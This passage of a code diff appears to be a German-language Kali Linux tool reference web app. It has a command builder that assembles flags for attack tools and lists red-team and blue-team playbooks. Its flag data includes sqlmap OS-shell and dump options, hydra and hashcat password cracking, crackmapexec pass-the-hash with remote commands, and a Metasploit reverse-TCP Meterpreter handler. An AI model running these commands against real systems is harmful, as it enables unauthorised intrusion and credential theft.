+      {id:'dump', prefix:'--dump ', label:'Dump Data', desc:'--dump -D db -T table — Daten exportieren', default:false},
+      {id:'os-shell', prefix:'--os-shell ', label:'OS Shell', desc:'--os-shell — Betriebssystem-Shell', default:false},
+      {id:'level=5', prefix:'--level=5 ', label:'Level 5', desc:'--level=5 — Maximale Test-Tiefe', default:false},
+      {id:'risk=3', prefix:'--risk=3 ', label:'Risk 3', desc:'--risk=3 — Maximales Risiko-Level', default:false},
+    ]
+  },
+  hashcat: {
+    target: {label:'Hash oder Hashfile', type:'text', default:'', placeholder:'hash oder hashfile.txt'},
+    flags: [
+      {id:'m', prefix:'-m 0 ', label:'Hash Mode (MD5)', desc:'-m 0 — MD5 Hash Mode', default:true},
+      {id:'a 0', prefix:'-a 0 ', label:'Dictionary Attack', desc:'-a 0 — Straight/Dictionary Mode', default:true},
+      {id:'force', prefix:'--force ', label:'Force', desc:'--force — GPU ignorieren, CPU nutzen', default:false},
+      {id:'O', prefix:'-O ', label:'Optimized', desc:'-O — Optimized Kernel (≤55 Zeichen)', default:false},
+      {id:'show', prefix:'--show ', label:'Show Cracked', desc:'--show — Bereits geknackte zeigen', default:false},
+      {id:'increment', prefix:'-a 3 ', label:'Brute Force', desc:'-a 3 — Brute-Force Mode', default:false},
+      {id:'rules', prefix:'-r /usr/share/hashcat/rules/best64.rule ', label:'Best64 Rules', desc:'-r best64.rule — Mutationsregeln', default:false},
+    ]
+  },
+  john: {
+    target: {label:'Hashfile', type:'text', default:'', placeholder:'hashes.txt'},
+    flags: [
+      {id:'wordlist', prefix:'--wordlist=/usr/share/wordlists/rockyou.txt ', label:'Rockyou', desc:'--wordlist=rockyou.txt', default:true},
+      {id:'format', prefix:'--format=raw-md5 ', label:'MD5 Format', desc:'--format=raw-md5', default:false},
+      {id:'show', prefix:'--show ', label:'Show Cracked', desc:'--show', default:false},
+      {id:'incremental', prefix:'--incremental ', label:'Incremental', desc:'--incremental — Brute-Force', default:false},
+      {id:'rules', prefix:'--rules ', label:'Wordlist Rules', desc:'--rules', default:false},
+    ]
+  },
+  gobuster: {
+    target: {label:'URL', type:'text', default:'', placeholder:'http://target.com'},
+    flags: [
+      {id:'dir', prefix:'dir ', label:'Directory Mode', desc:'dir — Verzeichnis-Brute-Force', default:true},
+      {id:'u', prefix:'-u ', label:'URL Flag', desc:'-u URL', default:true},
+      {id:'w', prefix:'-w /usr/share/wordlists/dirb/common.txt ', label:'Common Wordlist', desc:'-w common.txt', default:true},
+      {id:'x', prefix:'-x php,html,txt ', label:'Extensions', desc:'-x php,html,txt', default:false},
+      {id:'t', prefix:'-t 50 ', label:'50 Threads', desc:'-t 50', default:true},
+      {id:'s', prefix:'-s 200,204,301,302 ', label:'Status Codes', desc:'-s 200,204,301,302', default:false},
+    ]
+  },
+  nikto: {
+    target: {label:'Ziel', type:'text', default:'', placeholder:'http://target.com'},
+    flags: [
+      {id:'h', prefix:'-h ', label:'Host', desc:'-h host', default:true},
+      {id:'Tuning', prefix:'-Tuning 9 ', label:'SQL Injection Tune', desc:'-Tuning 9', default:false},
+      {id:'ssl', prefix:'-ssl ', label:'SSL', desc:'-ssl', default:false},
+      {id:'port', prefix:'-p 443 ', label:'Port', desc:'-p 443', default:false},
+      {id:'evasion', prefix:'-evasion 1 ', label:'IDS Evasion', desc:'-evasion 1', default:false},
+    ]
+  },
+  hydra: {
+    target: {label:'Ziel (protocol://host)', type:'text', default:'', placeholder:'ssh://192.168.1.1'},
+    flags: [
+      {id:'l', prefix:'-l admin ', label:'Username: admin', desc:'-l admin', default:true},
+      {id:'L', prefix:'-L /usr/share/wordlists/users.txt ', label:'User List', desc:'-L users.txt', default:false},
+      {id:'P', prefix:'-P /usr/share/wordlists/rockyou.txt ', label:'Password List', desc:'-P rockyou.txt', default:true},
+      {id:'t', prefix:'-t 4 ', label:'4 Threads', desc:'-t 4', default:true},
+      {id:'f', prefix:'-f ', label:'Stop on First Match', desc:'-f', default:false},
+      {id:'vV', prefix:'-vV ', label:'Verbose', desc:'-vV', default:true},
+    ]
+  },
+  aircrack: {
+    target: {label:'Capture File', type:'text', default:'', placeholder:'capture.cap'},
+    flags: [
+      {id:'w', prefix:'-w /usr/share/wordlists/rockyou.txt ', label:'Rockyou Wordlist', desc:'-w rockyou.txt', default:true},
+      {id:'b', prefix:'-b ', label:'BSSID', desc:'-b BSSID', default:false},
+      {id:'e', prefix:'-e ', label:'ESSID', desc:'-e ESSID', default:false},
+      {id:'q', prefix:'-q ', label:'Quiet', desc:'-q', default:false},
+    ]
+  },
+  metasploit: {
+    target: {label:'Modul (optional)', type:'text', default:'', placeholder:'use exploit/multi/handler'},
+    flags: [
+      {id:'q', prefix:'-q ', label:'Quiet', desc:'-q — Quiet Mode', default:true},
+      {id:'x', prefix:'-x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; run" ', label:'Auto-Handler', desc:'-x command', default:false},
+    ]
+  },
+  wpscan: {
+    target: {label:'URL', type:'text', default:'', placeholder:'http://target.com'},
+    flags: [
+      {id:'u', prefix:'--url ', label:'URL Flag', desc:'--url URL', default:true},
+      {id:'e', prefix:'--enumerate u,p,t ', label:'Enumerate All', desc:'--enumerate u,p,t', default:true},
+      {id:'passwords', prefix:'--passwords /usr/share/wordlists/rockyou.txt ', label:'Brute Force', desc:'--passwords rockyou.txt', default:false},
+      {id:'aggressive', prefix:'--detection-mode aggressive ', label:'Aggressive', desc:'--detection-mode aggressive', default:false},
+    ]
+  },
+  nuclei: {
+    target: {label:'URL', type:'text', default:'', placeholder:'http://target.com'},
+    flags: [
+      {id:'u', prefix:'-u ', label:'URL Flag', desc:'-u URL', default:true},
+      {id:'t', prefix:'-t cves/ ', label:'CVE Templates', desc:'-t cves/', default:false},
+      {id:'severity', prefix:'-severity critical,high ', label:'Critical+High', desc:'-severity critical,high', default:true},
+      {id:'rate-limit', prefix:'-rate-limit 150 ', label:'Rate Limit', desc:'-rate-limit 150', default:false},
+    ]
+  },
+  ffuf: {
+    target: {label:'URL mit FUZZ', type:'text', default:'', placeholder:'http://target.com/FUZZ'},
+    flags: [
+      {id:'u', prefix:'-u ', label:'URL Flag', desc:'-u URL/FUZZ', default:true},
+      {id:'w', prefix:'-w /usr/share/wordlists/dirb/common.txt ', label:'Common Wordlist', desc:'-w common.txt', default:true},
+      {id:'mc', prefix:'-mc 200,204,301,302 ', label:'Status Filter', desc:'-mc 200,204,301,302', default:true},
+      {id:'ac', prefix:'-ac ', label:'Auto Calibrate', desc:'-ac', default:false},
+      {id:'t', prefix:'-t 50 ', label:'50 Threads', desc:'-t 50', default:false},
+    ]
+  },
+  masscan: {
+    target: {label:'Ziel/Subnet', type:'text', default:'', placeholder:'10.0.0.0/24'},
+    flags: [
+      {id:'p', prefix:'-p1-65535 ', label:'All Ports', desc:'-p1-65535', default:true},
+      {id:'rate', prefix:'--rate 1000 ', label:'1000 Pps', desc:'--rate 1000', default:true},
+      {id:'sV', prefix:'--banner ', label:'Banner Grab', desc:'--banner', default:false},
+      {id:'echo', prefix:'--echo ', label:'Save Config', desc:'--echo', default:false},
+    ]
+  },
+  'evil-winrm': {
+    target: {label:'Host', type:'text', default:'', placeholder:'192.168.1.10'},
+    flags: [
+      {id:'i', prefix:'-i ', label:'IP', desc:'-i IP', default:true},
+      {id:'u', prefix:'-u Administrator ', label:'User: Admin', desc:'-u Administrator', default:true},
+      {id:'p', prefix:'-p Password123 ', label:'Password', desc:'-p PASS', default:true},
+      {id:'s', prefix:'-s /usr/share/evil-winrm/ ', label:'Scripts Path', desc:'-s PATH', default:false},
+      {id:'e', prefix:'-e /usr/share/evil-winrm/exe/ ', label:'EXE Path', desc:'-e PATH', default:false},
+    ]
+  },
+  crackmapexec: {
+    target: {label:'Ziel', type:'text', default:'', placeholder:'10.0.0.0/24'},
+    flags: [
+      {id:'smb', prefix:'smb ', label:'SMB Protocol', desc:'smb — SMB Protocol', default:true},
+      {id:'u', prefix:'-u admin ', label:'User', desc:'-u admin', default:false},
+      {id:'p', prefix:'-p Password123 ', label:'Password', desc:'-p PASS', default:false},
+      {id:'H', prefix:'-H ', label:'Hash (Pass-the-Hash)', desc:'-H HASH', default:false},
+      {id:'x', prefix:'-x "whoami" ', label:'Execute Command', desc:'-x CMD', default:false},
+    ]
+  },
+};
+// (showToolDetail is defined below — after the playbooks block)
+
+// Playbooks data — dual-mode (Blue + Purple)
+const playbooks = {
+  blue: [
+    {id:'recon-sprint', icon:'📡', name:'Recon Sprint', tools:['nmap','masscan','recon-ng','theHarvester','amass'], difficulty:'easy', desc:'Schnelle Aufklärung: Ports, Services, Emails, Subdomains.'},
+    {id:'web-pentest', icon:'🌐', name:'Web Pentest', tools:['burpsuite','sqlmap','zap','gobuster','ffuf','nuclei','wpscan'], difficulty:'medium', desc:'Vollständige Web-App-Analyse: Injection, Fuzzing, Scan.'},
+    {id:'password-crack', icon:'🔑', name:'Password Crack', tools:['hashcat','john','hydra','crunch','cewl'], difficulty:'medium', desc:'Hashes knacken, Online-Brute-Force, Wordlist-Gen.'},
+    {id:'wifi-audit', icon:'📶', name:'WiFi Audit', tools:['aircrack-ng','wifite','reaver','kismet'], difficulty:'medium', desc:'WPA/WPA2-Handshake-Capture, Crack, Rogue-AP.'},
+    {id:'ad-attack', icon:'🏰', name:'AD Attack Chain', tools:['nmap','metasploit','mimikatz','powershell-empire','evil-winrm','crackmapexec'], difficulty:'hard', desc:'Active Directory: Enum, Kerberoasting, Lateral Movement, DC.'},
+    {id:'post-exploit', icon:'⚙️', name:'Post-Exploit', tools:['metasploit','mimikatz','chisel','powershell-empire','evil-winrm'], difficulty:'hard', desc:'Persistence, Privilege Escalation, Lateral Movement.'},
+  ],
+  purple: [
+    {id:'system-hardening', icon:'🛡️', name:'System Hardening', tools:['ufw','fail2ban','apparmor','openssh','lynis'], difficulty:'easy', desc:'Basis-Härtung: Firewall, Brute-Force-Schutz, AppArmor, SSH.'},
+    {id:'active-overwatch', icon:'👁️', name:'Active Overwatch (SOC)', tools:['suricata','zeek','arkime','wazuh','osquery'], difficulty:'medium', desc:'24/7 Monitoring: IDS/IPS, Netzwerk-Analyse, Endpoint-Telemetry.'},
+    {id:'incident-response', icon:'🚨', name:'Incident Response', tools:['thehive','cortex','velociraptor','grr','cyberchef'], difficulty:'hard', desc:'IR-Pipeline: Triage, Investigate, Contain, Eradicate, Report.'},
+    {id:'threat-hunt', icon:'🔍', name:'Threat Hunt', tools:['yara','osquery','velociraptor','falco','zeek'], difficulty:'hard', desc:'Proaktive Bedrohungssuche: IOCs, TTPs, Behavioral Analytics.'},
+    {id:'vuln-assessment', icon:'📋', name:'Vuln Assessment', tools:['nmap','nikto','openvas','gvm','legion'], difficulty:'medium', desc:'Schwachstellen-Scan: Netzwerk, Web, Compliance-Report.'},
+    {id:'backup-recovery', icon:'💾', name:'Backup & Recovery', tools:['clonezilla','dd','testdisk','borgbackup','rsync'], difficulty:'easy', desc:'Backup-Strategie: Image, Restore, Verification.'},
+  ]
+};
+
+
+// ═══ TOOL DETAIL MODAL ═══
+function findToolGlobal(toolId) {
+  for (const mode of Object.keys(DB.modes)) {
+    for (const cat of DB.modes[mode].categories) {
+      const t = cat.tools.find(t => t.id === toolId);
+      if (t) return {tool: t, category: cat, mode: mode};
+    }
+  }
+  return null;
+}
+
+function showToolDetail(toolId) {
+  const found = findToolGlobal(toolId);
+  if (!found) return;
+  const {tool, category} = found;
+  const popLabel = {daily:'Daily Driver', classic:'Klassiker', gold:'Goldstandard', special:'Spezialist', standard:'Standard'};
+  const popClass = tool.pop || 'standard';
+
+  // Build tags section
+  const tagsHtml = (tool.tags && tool.tags.length)
+    ? `<div class="detail-tags">${tool.tags.map(t => `<span class="detail-tag">${t}</span>`).join('')}</div>`
+    : '';
+
+  // Build examples section (look up by id, also try variations like 'aircrack' → 'aircrack-ng')
+  const exKey = tool.id in toolExamples ? tool.id
+    : (tool.id + '-ng' in toolExamples ? tool.id + '-ng' : null);
+  const examples = exKey ? toolExamples[exKey] : null;
+  let examplesHtml = '';
+  if (examples && examples.length) {
+    examplesHtml = `<div class="detail-section">
+      <div class="detail-section-title">Beispiel-Kommandos</div>
+      <div class="detail-examples">${examples.map(ex => `
+        <div class="detail-example">
+          <div class="detail-example-cmd">${ex.cmd}</div>
+          <div class="detail-example-desc">${ex.desc}</div>
+        </div>`).join('')}</div>
+    </div>`;
+  }
+
+  // Build command builder section (look up by id, fall back to id+'-ng')
+  const flagKey = tool.id in toolFlags ? tool.id
+    : (tool.id + '-ng' in toolFlags ? tool.id + '-ng' : null);
+  const flags = flagKey ? toolFlags[flagKey] : null;
+  let cmdBuilderHTML = '';
+  if (flags) {
+    cmdBuilderHTML = `
+      <div class="cmdbuilder" id="cmdbuilder">
+        <div class="cmdbuilder-title">🔧 Command Builder</div>
+        <input type="text" class="cmdbuilder-target" id="cmd-target" placeholder="${flags.target.placeholder}" value="${flags.target.default}">
+        <div class="cmdbuilder-flags">
+          ${flags.flags.map(f => `
+            <div class="cmdbuilder-flag ${f.default ? 'active' : ''}" data-flag="${f.id}">
+              <input type="checkbox" class="cmdbuilder-checkbox" ${f.default ? 'checked' : ''}>
+              <div class="cmdbuilder-flag-info">
+                <div class="cmdbuilder-flag-label">${f.label}</div>
+                <div class="cmdbuilder-flag-desc">${f.desc}</div>
+              </div>
+            </div>
+          `).join('')}
+        </div>
+        <div class="cmdbuilder-output" id="cmd-output"></div>
+        <button class="cmdbuilder-copy" id="cmd-copy">Kopieren</button>
+        <div class="cmdbuilder-hint">Flags ein-/ausschalten → Command wird live generiert</div>
+      </div>
+    `;
+  }
+
+  // Build related tools (same category, excluding self)
+  const sameCat = category.tools.filter(t => t.id !== tool.id).slice(0, 6);
+  let relatedHtml = '';
+  if (sameCat.length) {
+    relatedHtml = `<div class="detail-section">
+      <div class="detail-section-title">Verwandte Tools (${category.name})</div>
+      <div class="detail-related">${sameCat.map(t => `
+        <div class="detail-related-card" data-related="${t.id}">
+          <div class="detail-related-name">${t.name}</div>
+          <div class="detail-related-cat">${category.icon} ${category.name}</div>
+        </div>`).join('')}</div>
+    </div>`;
+  } else {
+    // Fallback: find tools sharing any tag, excluding self
+    const toolTagSet = new Set(tool.tags || []);
+    const candidates = [];
+    for (const mode of Object.keys(DB.modes)) {
+      for (const cat of DB.modes[mode].categories) {
+        for (const t of cat.tools) {
+          if (t.id === tool.id) continue;
+          const shared = (t.tags || []).filter(tag => toolTagSet.has(tag)).length;
+          if (shared > 0) candidates.push({t, cat, shared});
+        }
+      }
+    }
+    candidates.sort((a, b) => b.shared - a.shared);
+    const top = candidates.slice(0, 6);
+    if (top.length) {
+      relatedHtml = `<div class="detail-section">
+        <div class="detail-section-title">Verwandte Tools (geteilte Tags)</div>
+        <div class="detail-related">${top.map(c => `
+          <div class="detail-related-card" data-related="${c.t.id}">
+            <div class="detail-related-name">${c.t.name}</div>
+            <div class="detail-related-cat">${c.cat.icon} ${c.cat.name}</div>
+          </div>`).join('')}</div>
+      </div>`;
+    }
+  }
+
+  // Build external links
+  const linksHtml = `<div class="detail-section">
+    <div class="detail-section-title">Externe Links</div>
+    <div class="detail-links">
+      <a class="detail-link" href="https://www.kali.org/tools/${tool.id}/" target="_blank" rel="noopener noreferrer">📖 Kali Page</a>
+      <a class="detail-link" href="https://man.kali.org/man/${tool.id}" target="_blank" rel="noopener noreferrer">📜 Man Page</a>
+      <a class="detail-link" href="https://www.google.com/search?q=${encodeURIComponent(tool.name + ' kali linux')}" target="_blank" rel="noopener noreferrer">🔍 Suche</a>
+    </div>
+  </div>`;
+
+  // Compose modal
+  const modalHtml = `
+    <button class="detail-close" id="detail-close" aria-label="Schließen">×</button>
+    <div class="detail-header">
+      <div class="detail-badge ${popClass}">${popLabel[popClass] || popClass}</div>
+      <div class="detail-name">${tool.name}</div>
+      <div class="detail-cat">${category.icon} ${category.name}</div>
+    </div>
+    <div class="detail-body">
+      <div class="detail-section">
+        <div class="detail-section-title">Beschreibung</div>
+        <div class="detail-desc">${tool.desc}</div>
+      </div>
+      ${tagsHtml ? `<div class="detail-section">
+        <div class="detail-section-title">Tags</div>
+        ${tagsHtml}
+      </div>` : ''}
+      <div class="detail-section">
+        <div class="detail-section-title">Standard-Kommando</div>
+        <div class="detail-cmd-block"><button class="detail-cmd-copy" data-cmd="${tool.cmd}" aria-label="Kopieren">Copy</button>${tool.cmd}</div>
+      </div>
+      ${examplesHtml}
+      ${cmdBuilderHTML}
+      ${relatedHtml}
+      ${linksHtml}
+    </div>
+  `;
+
+  document.getElementById('detail-modal').innerHTML = modalHtml;
+  document.getElementById('detail-overlay').classList.add('visible');
+
+  // Wire close button
+  document.getElementById('detail-close').addEventListener('click', closeToolDetail);
+  // Wire copy button in modal
+  document.querySelectorAll('.detail-cmd-copy').forEach(btn => {
+    btn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      const cmd = e.target.dataset.cmd;
+      navigator.clipboard.writeText(cmd).then(() => {
+        const old = e.target.textContent;
+        e.target.textContent = '✓';
+        setTimeout(() => e.target.textContent = old, 1500);
+      });
+    });
+  });
+  // Wire related-tool cards
+  document.querySelectorAll('.detail-related-card').forEach(card => {
+    card.addEventListener('click', (e) => {
+      e.stopPropagation();
+      showToolDetail(card.dataset.related);
+    });
+  });
+
+  // Wire command builder (only if present)
+  if (flags) {
+    const builder = document.getElementById('cmdbuilder');
+    if (builder) {
+      const output = document.getElementById('cmd-output');
+      const targetInput = document.getElementById('cmd-target');
+      const flagDivs = builder.querySelectorAll('.cmdbuilder-flag');
+      const checkboxes = builder.querySelectorAll('.cmdbuilder-checkbox');
+
+      // Toggle flag on click of entire row (except checkbox itself, which already toggles)
+      flagDivs.forEach((div) => {
+        div.addEventListener('click', (e) => {
+          if (e.target.tagName === 'INPUT') return; // checkbox handles itself
+          const cb = div.querySelector('.cmdbuilder-checkbox');
+          cb.checked = !cb.checked;
+          div.classList.toggle('active', cb.checked);
+          updateCommandPreview(tool.id, flags);
+        });
+        const cb = div.querySelector('.cmdbuilder-checkbox');
+        cb.addEventListener('change', () => {
+          div.classList.toggle('active', cb.checked);
+          updateCommandPreview(tool.id, flags);
+        });
+      });
+
+      // Update on target input change
+      targetInput.addEventListener('input', () => {
+        updateCommandPreview(tool.id, flags);
+      });
+
+      // Copy button
+      const copyBtn = document.getElementById('cmd-copy');
+      copyBtn.addEventListener('click', (e) => {
+        e.stopPropagation();
+        const cmd = output.textContent;
+        navigator.clipboard.writeText(cmd).then(() => {
+          const old = copyBtn.textContent;
+          copyBtn.textContent = '✓';
+          setTimeout(() => copyBtn.textContent = old, 1500);
+        });
+      });
+
+      // Initial render
+      updateCommandPreview(tool.id, flags);
+    }
+  }
+}
+
+function updateCommandPreview(toolId, flags) {
+  const output = document.getElementById('cmd-output');
+  const targetInput = document.getElementById('cmd-target');
+  if (!output || !targetInput) return;
+
+  const target = targetInput.value || '';
+  const flagDivs = document.querySelectorAll('#cmdbuilder .cmdbuilder-flag');
+  const parts = [toolId];
+  flagDivs.forEach(div => {
+    const cb = div.querySelector('.cmdbuilder-checkbox');
+    if (cb && cb.checked) {
+      const id = div.dataset.flag;
+      // Find the matching flag def to get its prefix (if any)
+      const flagDef = flags.flags.find(f => f.id === id);
+      let prefix;
+      if (flagDef && flagDef.prefix) {
+        prefix = flagDef.prefix;
+      } else if (id.startsWith('-')) {
+        // id already encodes the full flag string — append space, no synthetic `--`
+        prefix = id + ' ';
+      } else {
+        prefix = '--' + id + ' ';
+      }
+      parts.push(prefix);
+    }
+  });
+  if (target) parts.push(target);
+  output.textContent = parts.join('').trim();
+}
+
+function closeToolDetail() {
+  document.getElementById('detail-overlay').classList.remove('visible');
+}
+
+function switchMode(mode) {
+  currentMode = mode;
+  localStorage.setItem(MODE_KEY, mode);
+  document.documentElement.setAttribute('data-mode', mode);
+  // Update mode-switch buttons
+  document.querySelectorAll('.mode-btn').forEach(b => {
+    b.classList.toggle('active', b.dataset.mode === mode);
+  });
+  // Reset filters
+  currentCategory = 'all';
+  currentSearch = '';
+  favOnly = false;
+  document.getElementById('search').value = '';
+  compareSet.clear();
+  updateCompareBar();
+  activePlaybook = null;
+  selectedPromptTools.clear();
+  // Close all overlays so they don't leak across mode switch
+  document.getElementById('detail-overlay')?.classList.remove('visible');
+  document.getElementById('prompt-overlay')?.classList.remove('visible');
+  document.getElementById('wizard-overlay')?.classList.remove('visible');
+  // Re-render everything
+  renderFilterChips();
+  renderHeaderStats();
+  renderPlaybooks();
+  renderLearningPaths();
+  renderTools(getAllTools());
+}
+
+// Mode-switch click handlers
+document.querySelectorAll('.mode-btn').forEach(btn => {
+  btn.addEventListener('click', () => switchMode(btn.dataset.mode));
+});
+
+    renderPlaybooks();
+
+// Render category filter chips (driven by current mode)
+    function renderFilterChips() {
+      const container = document.getElementById('filter-chips');
+      container.innerHTML = '';
+
+      const allBtn = document.createElement('button');
+      allBtn.className = 'filter-btn active';
+      allBtn.setAttribute('aria-pressed', 'true');
+      allBtn.dataset.filter = 'all';
+      allBtn.innerHTML = 'Alle <span class="filter-count">' + totalTools() + '</span>';
+      container.appendChild(allBtn);
+
+      // Favorites filter button
+      const favBtn = document.createElement('button');
+      favBtn.className = 'filter-btn fav-filter';
+      favBtn.setAttribute('aria-pressed', 'false');
+      favBtn.dataset.filter = 'fav';
+      favBtn.innerHTML = '★ Favoriten <span class="filter-count">' + favorites.size + '</span>';
+      container.appendChild(favBtn);
+
+      // Category buttons (from current mode)
+      getCategories().forEach(cat => {
+        const count = cat.tools.length;
+        const btn = document.createElement('button');
+        btn.className = 'filter-btn';
+        btn.setAttribute('aria-pressed', 'false');
+        btn.dataset.filter = cat.id;
+        btn.innerHTML = cat.icon + ' ' + cat.name + ' <span class="filter-count">' + count + '</span>';
+        container.appendChild(btn);
+      });
+    }
+
+    // Render header stats (shows current mode badge + tool count)
+    function renderHeaderStats() {
+      const el = document.getElementById('header-stats');
+      const mode = getModeInfo();
+      el.innerHTML = '<span class="mode-badge ' + currentMode + '">' + mode.icon + ' ' + mode.label + '</span><br>' + totalTools() + ' Tools · Kali ' + DB.meta.kaliVersion;
+    }
+
+    // renderTools function — renders tool cards into #tool-grid
+    function renderTools(tools) {
+      const grid = document.getElementById('tool-grid');
+      const noResults = document.getElementById('no-results');
+
+      if (tools.length === 0) {
+        grid.innerHTML = '';
+        noResults.style.display = 'block';
+        return;
+      }
+      noResults.style.display = 'none';
+
+      // Category-Lookup für Category-Tag auf der Card
+      const toolCatMap = {};
+      getCategories().forEach(c => c.tools.forEach(t => { toolCatMap[t.id] = c; }));
+
+      grid.innerHTML = tools.map((tool, idx) => {
+        const popLabel = {daily:'Daily Driver', classic:'Klassiker', gold:'Goldstandard', special:'Spezialist', standard:'Standard'};
+        const cat = toolCatMap[tool.id] || {};
+        const hasAudio = tool.audioJump !== undefined;
+        return `
+        <article class="tool-card" data-category="${cat.id || ''}" data-id="${tool.id}">
+          <button class="fav-btn ${favorites.has(tool.id) ? 'active' : ''}" data-fav="${tool.id}" aria-label="${favorites.has(tool.id) ? 'Aus Favoriten entfernen' : 'Zu Favoriten hinzufügen'}" aria-pressed="${favorites.has(tool.id)}">${favorites.has(tool.id) ? '★' : '☆'}</button>
+          <div class="tool-pop ${tool.pop || 'standard'}">${popLabel[tool.pop] || tool.pop || 'Standard'}</div>
+          <div class="tool-card-head">
+            <div class="tool-name">${tool.name}</div>
+            <span class="tool-num">${cat.icon || '🔧'} ${cat.name || ''}</span>
+          </div>
+          <div class="tool-cmd"><button class="tool-cmd-copy" data-cmd="${tool.cmd}" aria-label="Befehl kopieren">Copy</button>${tool.cmd}</div>
+          <p class="tool-desc">${tool.desc}</p>
+          <div class="tool-tags">${(tool.tags || []).map(t => `<span class="tool-tag">${t}</span>`).join('')}</div>
+      <button class="compare-btn ${compareSet.has(tool.id) ? 'active' : ''}" data-compare="${tool.id}" aria-label="Zum Vergleichen hinzufügen">⚖ Vergleichen</button>
+      ${hasAudio ? `<div class="tool-audio">
+            <button class="tool-audio-btn" data-jump="${tool.audioJump}" aria-label="Springt zu Audio bei ${tool.audioTime}">
+              <span aria-hidden="true">▶</span> Audio
+            </button>
+            <span class="tool-audio-time">${tool.audioTime}</span>
+          </div>` : ''}
+        </article>`;
+      }).join('');
+      // Update results summary
+      const summary = document.getElementById('results-summary');
+      if (summary) summary.textContent = tools.length + ' von ' + totalTools() + ' Tools';
+      // Update clear button visibility
+      const clearBtn = document.getElementById('search-clear');
+      if (clearBtn) clearBtn.style.display = currentSearch ? 'block' : 'none';
+    }
+
+    // Copy command to clipboard
+    document.addEventListener('click', (e) => {
+      if (e.target.classList.contains('tool-cmd-copy')) {
+        const cmd = e.target.dataset.cmd;
+        navigator.clipboard.writeText(cmd).then(() => {
+          e.target.textContent = '✓';
+          setTimeout(() => e.target.textContent = 'Copy', 1500);
+        });
+      }
+    });
+
+    // Audio jump handler
+    document.addEventListener('click', (e) => {
+      const audioBtn = e.target.closest('.tool-audio-btn');
+      if (!audioBtn) return;
+      let audio = document.getElementById('forensik-audio');
+      if (!audio) {
+        audio = document.createElement('audio');
+        audio.id = 'forensik-audio';
+        audio.src = 'audio-forensik/kali-forensik-tour.mp3';
+        audio.preload = 'none';
+        document.body.appendChild(audio);
+      }
+      const jump = parseInt(audioBtn.dataset.jump || '0');
+      audio.currentTime = jump;
+      audio.play();
+    });
+
+    // Filter state (moved to top — see STATE block)
+
+    // Favorites — persisted in localStorage
+    // [MOVED TO TOP] favorites block
+    // Expose for debugging / external triggers
+    window.toggleFavorite = toggleFavorite;
+
+    function toggleFavorite(toolId) {
+      if (favorites.has(toolId)) favorites.delete(toolId);
+      else favorites.add(toolId);
+      saveFavorites();
+      renderTools(getFilteredTools());
+    }
+
+    // getFilteredTools: filter by category (current mode) + search + favorites
+    function getFilteredTools() {
+      let filtered = getAllTools();
+
+      if (favOnly) {
+        filtered = filtered.filter(t => favorites.has(t.id));
+      }
+
+      if (currentCategory !== 'all') {
+        filtered = filtered.filter(t => {
+          const cat = getCategory(currentCategory);
+          return cat && cat.tools.some(ct => ct.id === t.id);
+        });
+      }
+
+      if (currentSearch) {
+        const q = currentSearch.toLowerCase();
+        filtered = filtered.filter(t =>
+          t.name.toLowerCase().includes(q) ||
+          t.desc.toLowerCase().includes(q) ||
+          (t.tags && t.tags.some(tag => tag.toLowerCase().includes(q))) ||
+          t.cmd.toLowerCase().includes(q)
+        );
+      }
+
+      return filtered;
+    }
+
+    // Update the "Alle" count to reflect filtered results
+    function updateFilterCounts(visibleCount) {
+      const allBtn = document.querySelector('.filter-btn[data-filter="all"] .filter-count');
+      if (allBtn) allBtn.textContent = visibleCount;
+    }
+
+    // Debounce helper
+    function debounce(fn, ms) {
+      let t;
+      return (...args) => { clearTimeout(t); t = setTimeout(() => fn(...args), ms); };
+    }
+
+    // Wire up search input
+    const searchInput = document.getElementById('search');
+    const debouncedSearch = debounce((val) => {
+      currentSearch = val;
+      renderTools(getFilteredTools());
+      updateFilterCounts(getFilteredTools().length);
+    }, 150);
+    searchInput.addEventListener('input', (e) => debouncedSearch(e.target.value));
+
+    document.getElementById('search-clear').addEventListener('click', () => {
+      document.getElementById('search').value = '';
+      currentSearch = '';
+      renderTools(getFilteredTools());
+    });
+
+    // Wire up filter button clicks (event delegation)
+    document.getElementById('filter-chips').addEventListener('click', (e) => {
+      const btn = e.target.closest('.filter-btn');
+      if (!btn) return;
+
+      document.querySelectorAll('.filter-btn').forEach(b => {
+        b.classList.remove('active');
+        b.setAttribute('aria-pressed', 'false');
+      });
+      btn.classList.add('active');
+      btn.setAttribute('aria-pressed', 'true');
+
+      const f = btn.dataset.filter;
+      if (f === 'fav') {
+        favOnly = !favOnly;
+        btn.setAttribute('aria-pressed', favOnly ? 'true' : 'false');
+        if (favOnly) btn.classList.add('active'); else btn.classList.remove('active');
+        // Update fav count
+        const fc = btn.querySelector('.filter-count');
+        if (fc) fc.textContent = favorites.size;
+      } else {
+        currentCategory = f;
+      }
+      renderTools(getFilteredTools());
+    });
+
+    // Delegated click for favorite buttons
+    document.addEventListener('click', (e) => {
+      if (e.target.classList.contains('fav-btn')) {
+        e.stopPropagation();
+        toggleFavorite(e.target.dataset.fav);
+      }
+    });// [MOVED TO TOP] comparator state
+
+function toggleCompare(toolId) {
+  if (compareSet.has(toolId)) {
+    compareSet.delete(toolId);
+  } else {
+    if (compareSet.size >= MAX_COMPARE) return;
+    compareSet.add(toolId);
+  }
+  renderTools(getFilteredTools());
+  updateCompareBar();
+}
+
+function updateCompareBar() {
+  const bar = document.getElementById('compare-bar');
+  const items = document.getElementById('compare-items');
+  if (compareSet.size === 0) {
+    bar.classList.remove('visible');
+    return;
+  }
+  bar.classList.add('visible');
+  items.innerHTML = [...compareSet].map(id => {
+    const tool = getAllTools().find(t => t.id === id);
+    return `<div class="compare-item">${tool ? tool.name : id} <button class="compare-item-remove" data-compare-remove="${id}" aria-label="Entfernen">×</button></div>`;
+  }).join('');
+  const goBtn = document.getElementById('compare-go');
+  if (goBtn) {
+    goBtn.disabled = compareSet.size < 2;
+    goBtn.style.opacity = compareSet.size < 2 ? '.4' : '';
+    goBtn.style.cursor = compareSet.size < 2 ? 'not-allowed' : '';
+  }
+}
+
+function showCompareModal() {
+  if (compareSet.size < 2) return;
+  const tools = [...compareSet].map(id => getAllTools().find(t => t.id === id)).filter(Boolean);
+  const popLabel = {daily:'Daily Driver', classic:'Klassiker', gold:'Goldstandard', special:'Spezialist', standard:'Standard'};
+  const rows = [
+    {label:'Kategorie', get: t => { const c = getCategories().find(cat => cat.tools.some(ct => ct.id === t.id)); return c ? c.icon + ' ' + c.name : '—'; }},
